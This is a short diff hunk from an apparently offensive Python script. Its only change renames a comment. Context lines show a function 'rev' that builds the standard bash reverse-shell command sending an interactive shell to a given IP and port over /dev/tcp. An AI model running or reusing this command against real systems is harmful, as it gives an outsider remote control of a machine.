@@ -2,7 +2,7 @@ import sys
 import base64
 import requests
 
-# Making reverseshell
+# Making reverse_shell
 
 def rev(ip,port):
 	shell = "bash -i >& /dev/tcp/"+ ip + "/"+ port +" 0>&1"
